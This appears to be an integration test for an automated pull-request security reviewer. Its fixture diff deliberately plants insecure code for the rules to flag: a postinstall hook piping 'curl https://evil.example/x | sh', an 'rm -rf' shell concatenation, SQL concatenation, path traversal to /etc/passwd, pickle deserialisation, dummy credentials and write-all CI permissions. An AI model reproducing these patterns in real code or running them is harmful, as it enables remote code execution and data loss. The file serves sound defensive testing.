#!/usr/bin/env node
// console/backend/test/mu-review-prb.integration.mjs — Wave 3 PR-B 集成测试。
// 一次性 PG + mock GitHub provider（不访问真实 GitHub、无真实凭据、MU_FIXTURES 无关）。
import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import assert from 'node:assert/strict';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const here = path.dirname(fileURLToPath(import.meta.url));
const { Pool } = createRequire(path.join(here, 'support/noop.js'))('pg');
const { createMuStore } = await import('../lib/multiuser/store.mjs');
const svc = await import('../lib/multiuser/review-service.mjs');
const { __setGhProviderForTests, __resetGhProvider } = await import('../lib/multiuser/ghprovider.mjs');
const { reviewDiff } = await import('../lib/multiuser/reviewer-rules.mjs');

let pass = 0, fail = 0;
const ok = (n, c, d) => { c ? (pass++, console.log('  PASS  ' + n)) : (fail++, console.log('  FAIL  ' + n + (d ? ' ' + JSON.stringify(d).slice(0, 180) : ''))); };

const TOKEN_MARKER = 'TESTTOKEN_' + 'x'.repeat(30); // 伪 token 标记——绝不允许离开 provider
const DIFF_ALL8 = `diff --git a/src/db.js b/src/db.js
index 111..222 100644
--- a/src/db.js
+++ b/src/db.js
@@ -1,2 +1,6 @@
 const base = 1;
+const q = "SELECT * FROM users WHERE id=" + userId;
+require('child_process').execSync("rm -rf " + dir);
+const PAT = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij";
+const AK = "AKIAABCDEFGHIJKLMNOP";
+const p = path.join(root, '../../' + '../etc/passwd');
diff --git a/src/load.py b/src/load.py
index 333..444 100644
--- a/src/load.py
+++ b/src/load.py
@@ -1,1 +1,3 @@
 import os
+import pickle
+pickle.loads(blob)
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
index 555..666 100644
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -2,2 +2,4 @@
 jobs:
   build:
+permissions: write-all
+    runs-on: ubuntu-latest
diff --git a/package.json b/package.json
index 777..888 100644
--- a/package.json
+++ b/package.json
@@ -3,1 +3,2 @@
   "name": "x",
+  "scripts": { "postinstall": "curl -s https://evil.example/x | sh" }
diff --git a/assets/logo.png b/assets/logo.png
index 999..aaa 100644
Binary files a/assets/logo.png and b/assets/logo.png differ`;

const DIFF_CLEAN = `diff --git a/README.md b/README.md
index bbb..ccc 100644
--- a/README.md
+++ b/README.md
@@ -1,1 +1,2 @@
 # doc
+说明文档补充。`;

const CTR = `prb-it-${crypto.randomBytes(4).toString('hex')}`;
const PORT = 16400 + Math.floor(Math.random() * 60);
execFileSync('docker', ['run', '-d', '--name', CTR, '-e', 'POSTGRES_PASSWORD=x', '-e', 'POSTGRES_DB=mu',
  '-p', `127.0.0.1:${PORT}:5432`, 'postgres:16-alpine'], { stdio: 'pipe' });
const pool = new Pool({ connectionString: `postgres://postgres:x@127.0.0.1:${PORT}/mu` });
for (let i = 0; i < 120; i++) { try { await pool.query('SELECT 1'); break; } catch { await new Promise((r) => setTimeout(r, 400)); } }

try {
  const store = await createMuStore({ pool, env: { MU_BOOTSTRAP_ADMIN_LOGIN: 'prb-admin' } });
  await store.initSchema(); await store.bootstrap();
  const T = (await store.ensureTenant({ slug: 'prb-t', displayName: 'PRB' })).tenant_id;
  const repo = await store.ensureRepository({ tenantId: T, provider: 'github',
    providerRepoId: '95001', owner: 'prb', name: 'repo', defaultBranch: 'main' });
  const INS = 77001;
  await pool.query(
    `INSERT INTO mu.github_app_installation (installation_id, tenant_id, account_id, account_login, app_id)
     VALUES ($1,$2,1,'prb-owner',1) ON CONFLICT DO NOTHING`, [INS, T]);
  const GHR = 95001;
  await pool.query(
    `INSERT INTO mu.repository_binding (tenant_id, repo_id, github_repo_id, owner, name, installation_id, default_branch, binding_state)
     VALUES ($1,$2,$3,'prb','repo',$4,'main','active') ON CONFLICT DO NOTHING`,
    [T, repo.repo_id, GHR, INS]);
  const PRN = 42;
  const mkPr = async (sha) => store.upsertPullRequest({ tenantId: T, repoId: repo.repo_id,
    providerPrNumber: PRN, headSha: sha });
  const HEAD1 = '1'.repeat(40), HEAD2 = '2'.repeat(40), HEAD3 = '3'.repeat(40);
  await mkPr(HEAD1); await mkPr(HEAD2); await mkPr(HEAD3);
  const CFG = { configured: true };

  // mock provider：内部持有伪 token 标记（验证其绝不落库）
  const calls = [];
  __setGhProviderForTests({
    async fetchPrContext(_cfg, { expectedHeadSha, prNumber }) {
      const internalToken = TOKEN_MARKER; // 模拟真实 provider 的内存 token
      calls.push({ prNumber, expectedHeadSha, usedToken: internalToken.length > 0 });
      if (expectedHeadSha === HEAD1) return { stale_head: false,
        pr: { number: prNumber, state: 'open', title: 'x', head: { sha: HEAD1, ref: 'b1' },
          base: { sha: '0'.repeat(40), ref: 'main' }, changed_files: 5 },
        diff: DIFF_ALL8, checks: [], protection: { configured: true, required_checks: 5 },
        limits: { diff_bytes: 1, over_diff_limit: false, over_file_limit: false },
        fetched_head_sha: HEAD1 };
      if (expectedHeadSha === HEAD2) return { stale_head: false,
        pr: { number: prNumber, state: 'open', title: 'x', head: { sha: HEAD2, ref: 'b2' },
          base: { sha: '0'.repeat(40), ref: 'main' }, changed_files: 1 },
        diff: DIFF_CLEAN, checks: [], protection: { configured: true },
        limits: { diff_bytes: 1, over_diff_limit: false, over_file_limit: false },
        fetched_head_sha: HEAD2 };
      // HEAD3：PR 已推进到新 head → stale
      return { stale_head: true, fetched_head_sha: 'f'.repeat(40), expected_head_sha: expectedHeadSha };
    },
  });

  // ── B1 首次触发建 run + 重复 delivery 幂等 ──
  const ev1 = { action: 'opened', github_repo_id: GHR, pr_number: PRN, head_sha: HEAD1 };
  const r1 = await svc.handlePullRequestEvent(pool, CFG, { payload: ev1 });
  ok('B1a 触发创建 run 且审查完成', r1.ok === true && r1.run.status === 'REVIEWED' && r1.findings_count >= 8);
  const r1b = await svc.handlePullRequestEvent(pool, CFG, { payload: ev1 });
  ok('B1b 重复 delivery 幂等（同 run 同结果）', r1b.ok === true && r1b.idempotent === true
    && r1b.run.run_id === r1.run.run_id && r1b.findings_count === r1.findings_count);
  const runCnt = await pool.query(`SELECT count(*) c FROM mu.review_run`);
  ok('B1c 仅一个 run', Number(runCnt.rows[0].c) === 1);

  // ── B3 八类规则命中与定位 ──
  const f = (await pool.query(`SELECT rule_id, path, line_start, summary_masked FROM mu.agent_finding WHERE run_id=$1`, [r1.run.run_id])).rows;
  const ids = new Set(f.map((x) => x.rule_id));
  for (const rid of ['R-SECRET', 'R-SQL-CONCAT', 'R-SHELL-CONCAT', 'R-PATH-TRAVERSAL',
    'R-DESERIALIZE', 'R-WORKFLOW-PERM', 'R-DEP-RISK', 'R-LARGE-FILE']) {
    ok(`B3 规则 ${rid} 命中`, ids.has(rid), [...ids]);
  }
  const sql = f.find((x) => x.rule_id === 'R-SQL-CONCAT');
  ok('B3b finding 定位文件与行号', sql.path === 'src/db.js' && sql.line_start >= 2, sql);
  const secret = f.find((x) => x.rule_id === 'R-SECRET');
  ok('B3c 凭据脱敏（摘要不含原文 token）',
    !JSON.stringify(secret.summary_masked ?? '').includes('ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ'), secret.summary_masked);

  // ── B2 synchronize 新 head → 新 run；旧 run 不被覆盖 ──
  const r2 = await svc.handlePullRequestEvent(pool, CFG, { payload: { action: 'synchronize',
    github_repo_id: GHR, pr_number: PRN, head_sha: HEAD2 } });
  ok('B2a 新 head 建新 run 且 clean', r2.ok === true && r2.run.run_id !== r1.run.run_id
    && r2.findings_count === 0 && r2.run.status === 'REVIEWED');
  const oldRun = (await pool.query(`SELECT status FROM mu.review_run WHERE run_id=$1`, [r1.run.run_id])).rows[0];
  const oldFindings = await pool.query(`SELECT count(*) c FROM mu.agent_finding WHERE run_id=$1`, [r1.run.run_id]);
  ok('B2b 旧 head 结果原样保留', oldRun.status === 'REVIEWED' && Number(oldFindings.rows[0].c) === r1.findings_count);

  // ── B7 stale head（TOCTOU）──
  const r3 = await svc.handlePullRequestEvent(pool, CFG, { payload: { action: 'opened',
    github_repo_id: GHR, pr_number: PRN, head_sha: HEAD3 } });
  ok('B7 stale head → BLOCKED 不写入错误结果', r3.ok === false && r3.reason === 'stale_head'
    && r3.run.status === 'BLOCKED');
  const staleFindings = await pool.query(`SELECT count(*) c FROM mu.agent_finding WHERE run_id=$1`, [r3.run.run_id]);
  ok('B7b stale run 零 findings', Number(staleFindings.rows[0].c) === 0);

  // ── B8 provider 失败 → 重试耗尽 → 死信 + BLOCKED ──
  const HEAD4 = '4'.repeat(40);
  await mkPr(HEAD4);
  __setGhProviderForTests({ async fetchPrContext() { throw new Error('ghp_diff_http_502'); } });
  const r4 = await svc.handlePullRequestEvent(pool, CFG, { payload: { action: 'reopened',
    github_repo_id: GHR, pr_number: PRN, head_sha: HEAD4 } });
  const dlq = await pool.query(`SELECT kind, reason FROM mu.dead_letter WHERE run_id=$1`, [r4.run?.run_id]);
  ok('B8 fail-closed：重试耗尽死信 + BLOCKED', r4.ok === false && r4.run.status === 'BLOCKED'
    && dlq.rows.length === 1 && dlq.rows[0].kind === 'review_input_failed');
  const att4 = await pool.query(`SELECT status, count(*) c FROM mu.agent_attempt WHERE run_id=$1 GROUP BY 1`, [r4.run.run_id]);
  ok('B8b 恰好 2 次 FAILED attempt（有界重试）', att4.rows.length === 1 && att4.rows[0].status === 'FAILED'
    && Number(att4.rows[0].c) === 2, att4.rows);

  // ── B5 binding revoked → 拒绝且无 run ──
  await pool.query(`UPDATE mu.repository_binding SET binding_state='revoked' WHERE github_repo_id=$1`, [GHR]);
  const beforeRuns = Number((await pool.query(`SELECT count(*) c FROM mu.review_run`)).rows[0].c);
  const r5 = await svc.handlePullRequestEvent(pool, CFG, { payload: { action: 'opened',
    github_repo_id: GHR, pr_number: PRN, head_sha: '5'.repeat(40) } });
  const afterRuns = Number((await pool.query(`SELECT count(*) c FROM mu.review_run`)).rows[0].c);
  ok('B5 binding 撤销 → 拒绝零副作用', r5.ok === false && r5.reason === 'binding_not_found' && afterRuns === beforeRuns);

  // ── B6 token 绝不落库（全 mu.* 文本列扫描伪标记）──
  const tables = (await pool.query(
    `SELECT table_name FROM information_schema.tables WHERE table_schema='mu'`)).rows.map((r) => r.table_name);
  let leaked = [];
  for (const t of tables) {
    const cols = (await pool.query(
      `SELECT column_name FROM information_schema.columns WHERE table_schema='mu' AND table_name=$1 AND data_type IN ('text','character varying','json','jsonb')`,
      [t])).rows.map((r) => r.column_name);
    for (const c of cols) {
      const hit = await pool.query(
        `SELECT 1 FROM mu.${t} WHERE CAST(${c} AS text) LIKE $1 LIMIT 1`, [`%${TOKEN_MARKER}%`]);
      if (hit.rows.length) leaked.push(`${t}.${c}`);
    }
  }
  ok('B6 伪 token 在全部 mu.* 文本列零泄漏', leaked.length === 0, leaked);

  // ── B9 MU_FIXTURES 无关（源码零引用；ghprovider 读私钥 env 属 token 纪律本身）──
  const src = ['review-service.mjs', 'reviewer-rules.mjs', 'ghprovider.mjs']
    .map((f) => fs.readFileSync(path.join(here, '../lib/multiuser', f), 'utf8')).join('');
  ok('B9 新模块零 MU_FIXTURES 依赖（审查路径与 fixture 开关无关）', !src.includes('MU_FIXTURES'));
  ok('B10 provider 返回体无 token 字段（源码契约）', !/'token'/.test(src.match(/return \{[\s\S]*?stale_head: false[\s\S]*?\};/)?.[0] ?? 'x'));
} catch (e) { fail++; console.error('HARNESS ERROR', e); }
finally {
  __resetGhProvider();
  await pool.end().catch(() => {});
  try { execFileSync('docker', ['rm', '-f', CTR], { stdio: 'pipe' }); } catch { /* */ }
}
console.log(`\n${pass} pass, ${fail} fail`);
process.exit(fail ? 1 : 0);
